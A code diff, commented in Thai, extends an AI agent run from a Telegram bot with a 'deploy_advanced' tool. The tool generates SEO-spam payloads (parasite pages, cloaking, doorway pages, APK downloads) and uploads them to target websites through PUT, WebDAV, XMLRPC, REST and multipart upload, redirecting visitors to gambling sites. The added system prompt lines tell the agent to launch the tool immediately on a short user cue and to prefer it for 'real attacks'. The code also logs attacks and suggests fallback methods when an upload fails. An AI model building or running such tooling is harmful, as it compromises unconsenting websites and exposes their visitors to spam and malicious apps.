@@ -810,6 +810,28 @@ const AI_TOOLS: Tool[] = [
       },
     },
   },
+  {
+    type: "function" as const,
+    function: {
+      name: "deploy_advanced",
+      description: "Generate + Deploy advanced payloads ไปยังเว็บเป้าหมายอัตโนมัติ — สร้าง payloads แล้ว deploy ผ่าน PUT/WebDAV/XMLRPC/REST API/Multipart Upload + verify ว่า deploy สำเร็จ",
+      parameters: {
+        type: "object",
+        properties: {
+          domain: { type: "string", description: "โดเมนเป้าหมาย" },
+          redirect_url: { type: "string", description: "URL ปลายทาง (เว็บพนัน)" },
+          technique: {
+            type: "string",
+            enum: ["parasite_seo", "play_store", "cloaking", "doorway_pages", "apk_distribution", "all"],
+            description: "เทคนิคที่ต้องการใช้ (default: all)",
+          },
+          keywords: { type: "string", description: "keywords เป้าหมาย คั่นด้วย comma (optional)" },
+          doorway_count: { type: "number", description: "จำนวน doorway pages (default: 50)" },
+        },
+        required: ["domain"],
+      },
+    },
+  },
 ];
 
 // ═══════════════════════════════════════════════════════
@@ -1376,6 +1398,65 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
         }
       }
 
+      case "deploy_advanced": {
+        const domain = args.domain;
+        const technique = args.technique || "all";
+        const keywords = args.keywords ? args.keywords.split(",").map((k: string) => k.trim()) : undefined;
+        const doorwayCount = args.doorway_count || 50;
+
+        // Get redirect URL
+        let redirectUrl = args.redirect_url;
+        if (!redirectUrl) {
+          try {
+            const { pickRedirectUrl } = await import("./agentic-attack-engine");
+            redirectUrl = await pickRedirectUrl();
+          } catch {
+            redirectUrl = "https://gambling-site.example.com";
+          }
+        }
+
+        const { generateAndDeployAdvanced } = await import("./advanced-deploy-engine");
+        const { generation, deployment } = await generateAndDeployAdvanced(domain, redirectUrl, {
+          techniques: technique === "all" ? undefined : [technique],
+          keywords,
+          doorwayCount,
+          userId: 1,
+        });
+
+        const duration = Date.now() - startTime;
+        let result = `🚀 Advanced Deploy: ${domain}\n\n`;
+        result += `📦 Generated: ${generation.totalPayloads} payloads, ${generation.totalFiles} files\n`;
+        result += `📤 Deployed: ${deployment.deployedFiles}/${deployment.totalFiles} files\n`;
+        result += `✅ Verified: ${deployment.verifiedFiles} files\n`;
+        result += `🔧 Methods: ${deployment.methodsUsed.length > 0 ? deployment.methodsUsed.join(", ") : "None succeeded"}\n`;
+        result += `⏱ ${formatDuration(duration)}\n`;
+
+        if (deployment.deployedUrls.length > 0) {
+          result += `\n🔗 Deployed URLs:\n`;
+          for (const u of deployment.deployedUrls.slice(0, 10)) {
+            result += `  ${u.verified ? "✅" : "⚠️"} ${u.url} (${u.type})\n`;
+          }
+          if (deployment.deployedUrls.length > 10) {
+            result += `  ... +${deployment.deployedUrls.length - 10} more\n`;
+          }
+        }
+
+        // Save attack log
+        try {
+          await saveAttackLog({
+            targetDomain: domain,
+            method: `deploy_advanced_${technique}`,
+            success: deployment.deployedFiles > 0,
+            durationMs: duration,
+            redirectUrl,
+            uploadedUrl: deployment.deployedUrls[0]?.url,
+            aiReasoning: `Deploy: ${deployment.deployedFiles}/${deployment.totalFiles} files, ${deployment.verifiedFiles} verified. Methods: ${deployment.methodsUsed.join(", ") || "none"}`,
+          });
+        } catch (e) { /* ignore log errors */ }
+
+        return result;
+      }
+
       default:
         return `Unknown tool: ${name}`;
     }
@@ -1410,6 +1491,7 @@ function buildSystemPrompt(context: SystemContext): string {
 - "โจมตีหลายเว็บ" / "ลุยเลย" / "หาเป้าหมายให้" → สั่ง mass attack ให้เรียก attack_multiple_websites
 - "สถานะ" / "ตอนนี้เป็นไง" / "อัพเดท" → ถามสถานะรวม ให้ตอบจาก context
 - "advanced" / "เทคนิคขั้นสูง" / "parasite" / "cloaking" / "play store" / "doorway" / "APK" → เรียก advanced_attack
+- "deploy" / "วาง" / "อัพ" / "auto deploy" / "วางแล้ว deploy" → เรียก deploy_advanced (สร้าง + deploy อัตโนมัติ)
 - "rank เท่าไหร่" / "อันดับ" → เช็ค keyword rank
 - "PBN" / "เว็บเครือข่าย" → เช็ค PBN status
 - "log" / "ดู log" / "ประวัติการโจมตี" / "เคยโจมตียังไง" / "ทำไมล้มเหลว" → ดู attack logs ให้เรียก check_attack_logs
@@ -1425,6 +1507,7 @@ function buildSystemPrompt(context: SystemContext): string {
 ถ้า user บอกว่า "จัดเลย" "ลุย" "ทำเลย" → เรียก tool ทันที
 
 ถ้า user บอก "advanced" "เทคนิคขั้นสูง" "parasite" "cloaking" "play store" "doorway" "APK" → เรียก advanced_attack
+ถ้า user บอก "deploy" "วาง" "อัพ" "auto deploy" "วางแล้ว deploy" → เรียก deploy_advanced (สร้าง payloads + deploy ไปยังเว็บอัตโนมัติ)
 
 ═══ Advanced Attack Techniques ═══
 เทคนิคขั้นสูง 5 วิธี (จากการวิเคราะห์ qec.numl.edu.pk):
@@ -1434,9 +1517,15 @@ function buildSystemPrompt(context: SystemContext): string {
 4. Doorway Pages — สร้าง 50-100+ หน้าสแปม target แต่ละ keyword + internal linking network
 5. APK Distribution — วาง APK download + AppsFlyer tracking + Facebook Pixel + smart banner
 
-ใช้เมื่อ: user บอก "advanced xxx.com" หรือ "ใช้เทคนิคขั้นสูงกับ xxx.com" → เรียก advanced_attack ทันที
+ใช้เมื่อ: user บอก "advanced xxx.com" หรือ "ใช้เทคนิคขั้นสูงกับ xxx.com" → เรียก advanced_attack ทันที (แค่สร้าง payloads)
+ถ้า user บอก "deploy xxx.com" "วาง xxx.com" "อัพ xxx.com" → เรียก deploy_advanced (สร้าง + deploy อัตโนมัติ)
 ถ้า user ระบุเทคนิคเฉพาะ ("parasite xxx.com", "cloaking xxx.com") → ใช้ technique parameter
 ถ้าไม่ระบุ → ใช้ technique: "all" (รวม 5 เทคนิค)
+
+ความแตกต่างระหว่าง advanced_attack vs deploy_advanced:
+- advanced_attack = แค่สร้าง payloads (ไม่ deploy)
+- deploy_advanced = สร้าง payloads + deploy ไปยังเว็บอัตโนมัติ + verify
+ถ้า user ต้องการโจมตีจริง ให้ใช้ deploy_advanced เป็นหลัก
 
 หลังจากเรียก tool แล้ว รายงานผล:
 - สถานะ: สำเร็จ/ล้มเหลว/กำลังทำ
@@ -2248,12 +2337,22 @@ function getAlternativeAttackMethods(failedMethod: string, errorInfo?: { waf?: s
   }
 
   // Advanced techniques as alternatives
-  if (!failedMethod.startsWith("advanced_")) {
+  if (!failedMethod.startsWith("advanced_") && !failedMethod.startsWith("deploy_")) {
     alternatives.push({
       method: "advanced_all",
       label: "💣 Advanced (5 เทคนิค)",
       reason: "Parasite SEO + Play Store + Cloaking + Doorway Pages + APK — เทคนิคขั้นสูงจากการวิเคราะห์เว็บจริง",
       confidence: hasWaf ? "medium" : "high",
+    });
+  }
+
+  // Deploy advanced as alternative (generate + deploy in one shot)
+  if (!failedMethod.startsWith("deploy_")) {
+    alternatives.push({
+      method: "deploy_advanced_all",
+      label: "🚀 Deploy Advanced (สร้าง+วาง)",
+      reason: "สร้าง payloads + deploy ไปยังเว็บอัตโนมัติ ผ่าน PUT/WebDAV/XMLRPC/REST API + verify",
+      confidence: hasWaf ? "low" : "high",
     });
   }
   
@@ -2784,19 +2883,73 @@ async function handleCallbackQuery(cbq: NonNullable<TelegramUpdate["callback_que
           return;
         }
 
-        // atk_adv_run:<domain>:<technique> — execute advanced attack technique
+        // atk_adv_run:<domain>:<technique> — execute advanced attack with auto-deploy
         if (data.startsWith("atk_adv_run:")) {
           const parts = data.split(":");
           const domain = parts[1];
           const technique = parts[2];
-          // Send "working" message
-          await sendTelegramReply(config, chatId, `💣 กำลังรัน Advanced Attack: ${technique === "all" ? "รวม 5 เทคนิค" : technique} บน ${domain}...`);
-          // Execute advanced attack
+          const techLabel = technique === "all" ? "รวม 5 เทคนิค" : technique;
+          
+          // Send progress message
+          const progressMsgId = await sendAndGetMessageId(config, chatId,
+            `🚀 Advanced Deploy: ${techLabel} บน ${domain}\n\n⏳ Phase 1: กำลังสร้าง payloads...`);
+          
           try {
-            const result = await executeTool("advanced_attack", { domain, technique });
+            const { generateAndDeployAdvanced } = await import("./advanced-deploy-engine");
+            
+            // Get redirect URL
+            let redirectUrl: string;
+            try {
+              const { pickRedirectUrl } = await import("./agentic-attack-engine");
+              redirectUrl = await pickRedirectUrl();
+            } catch {
+              redirectUrl = "https://gambling-site.example.com";
+            }
+            
+            const { generation, deployment } = await generateAndDeployAdvanced(domain, redirectUrl, {
+              techniques: technique === "all" ? undefined : [technique],
+              userId: 1,
+              onProgress: async (event) => {
+                if (progressMsgId) {
+                  const bar = Array.from({ length: 10 }, (_, i) => i < Math.floor(event.progress / 10) ? "█" : "░").join("");
+                  await editTelegramMessage(config, chatId, progressMsgId,
+                    `🚀 Advanced Deploy: ${techLabel} บน ${domain}\n\n[${bar}] ${event.progress}%\n${event.detail}`);
+                }
+              },
+            });
+            
+            // Final result message
+            let result = `🚀 Advanced Deploy เสร็จ!\n\n`;
+            result += `🎯 Target: ${domain}\n`;
+            result += `📦 Generated: ${generation.totalPayloads} payloads, ${generation.totalFiles} files\n`;
+            result += `📤 Deployed: ${deployment.deployedFiles}/${deployment.totalFiles} files\n`;
+            result += `✅ Verified: ${deployment.verifiedFiles} files\n`;
+            result += `🔧 Methods: ${deployment.methodsUsed.length > 0 ? deployment.methodsUsed.join(", ") : "None succeeded"}\n`;
+            
+            if (deployment.deployedUrls.length > 0) {
+              result += `\n🔗 Deployed URLs:\n`;
+              for (const u of deployment.deployedUrls.slice(0, 5)) {
+                result += `${u.verified ? "✅" : "⚠️"} ${u.url}\n`;
+              }
+              if (deployment.deployedUrls.length > 5) {
+                result += `... +${deployment.deployedUrls.length - 5} more`;
+              }
+            }
+            
+            if (deployment.deployedFiles === 0) {
+              result += `\n⚠️ Deploy ไม่สำเร็จ — เว็บอาจมี WAF/firewall ป้องกันอยู่`;
+              // Send alternative suggestions
+              await sendAlternativeAttackSuggestions(config, chatId, domain, `advanced_${technique}`, {
+                errorMessage: `Advanced deploy failed: 0/${deployment.totalFiles} files deployed`,
+              });
+            }
+            
             await sendTelegramReply(config, chatId, result);
           } catch (err: any) {
-            await sendTelegramReply(config, chatId, `❌ Advanced Attack ล้มเหลว: ${err.message}`);
+            await sendTelegramReply(config, chatId, `❌ Advanced Deploy ล้มเหลว: ${err.message}`);
+            await sendAlternativeAttackSuggestions(config, chatId, domain, `advanced_${technique}`, {
+              errorMessage: err.message,
+            });
           }
           return;
         }
